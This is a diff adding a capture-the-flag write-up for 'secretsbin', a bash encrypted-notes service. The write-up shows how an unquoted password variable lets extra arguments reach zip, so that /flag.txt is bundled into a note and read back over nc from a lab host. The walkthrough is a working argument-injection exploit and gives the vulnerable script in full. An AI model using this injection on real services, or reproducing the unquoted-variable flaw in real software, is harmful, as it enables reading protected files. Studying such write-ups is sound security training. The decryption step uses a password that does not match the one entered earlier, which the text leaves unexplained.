@@ -540,3 +540,126 @@ if __name__ == "__main__":
     main()
 
 ```
+
+### S=secretsbin
+Description - I built my own temporary, encrypted notes service! I am pretty confident about my bash skills, but just in case, can you see if there are any bugs in it? 
+It listens on port 1337. Just in case you get in, the flag is in /flag.txt Flag format:
+FLAG{example_flag_format}
+
+This is the given code. Note the use of unquoted variables which is dangerous in bash.
+
+```
+#!/bin/bash
+
+# set -x
+
+encrypt () {
+        src=$1
+        dest=$2
+        pass=$3
+        # echo "src dirname: $(dirname $src)"
+        cd $(dirname $src)
+        zip $dest.zip * -P $pass
+}
+
+decrypt () {
+        file=$1
+        pass=$2
+        tempdir=$(mktemp -d)
+        cd $tempdir
+        unzip -P $pass $file
+        cat *
+}
+
+cleanup () {
+        # cleanup old notes
+        # -cmin on some systems
+        find ./notes/ -type f -mmin +10 -delete
+}
+
+echo "--------->secretsbin>*********"
+echo "[1] new temporary note (removed after 10 minutes)"
+echo "[2] read encrypted note"
+echo -en "> "
+read INPUT
+if [[ $INPUT == "1" ]]
+then
+        cleanup
+        echo "welcome to secretsbin! enter password to encrypt your note:"
+        read PASSWORD
+        echo "enter your note, end with EOF:"
+        TEMPFILE=$(mktemp -d)/notes.txt
+        while read line
+        do
+                if [[ $line != "EOF" ]]
+                then
+                        echo -n "> "
+                        echo "$line" >> $TEMPFILE
+                else
+                        break
+                fi
+        done
+        OUTFILE=$(head /dev/urandom|sum|cut -d ' ' -f1)
+        encrypt "$TEMPFILE" "/notes/$OUTFILE" "$PASSWORD"
+        echo "your note ID is $OUTFILE"
+fi
+
+if [[ $INPUT == "2" ]]
+then
+        cleanup
+        echo "welcome to secretsbin! enter password to decrypt your note:"
+        read PASSWORD
+        echo "enter your note ID:"
+        read NOTEID
+
+        decrypt "/notes/$NOTEID.zip" $PASSWORD
+fi
+```
+Solution:
+When connecting to the server, it presents the following:
+```
+└─$ nc 10.107.0.4 1337
+--------->secretsbin>*********
+[1] new temporary note (removed after 10 minutes)
+[2] read encrypted note
+> 1
+welcome to secretsbin! enter password to encrypt your note:
+```
+Made use of the vulnerable password variable used when setting the password and entered:
+```
+thisismypassword cat /flag.txt
+```
+This rendered the output:
+```
+thisismypassword cat /flag.txt
+enter your note, end with EOF:
+test
+> EOF
+        zip warning: name not matched: cat
+  adding: notes.txt (stored 0%)
+  adding: flag.txt (stored 0%)
+your note ID is 24385
+```
+Note the addition of flag.txt
+
+Reconnected to the server and selected option 2
+```
+└─$ nc 10.107.0.4 1337
+--------->secretsbin>*********
+[1] new temporary note (removed after 10 minutes)
+[2] read encrypted note
+> 2
+welcome to secretsbin! enter password to decrypt your note:
+my
+enter your note ID:
+24385
+Archive:  /notes/24385.zip
+ extracting: notes.txt               
+ extracting: flag.txt                
+FLAG{bash_is_a_tr4p}
+test
+```
+You can see that flag.txt has also been printed.
+
+:+1: FLAG{bash_is_a_tr4p}
+<hr>
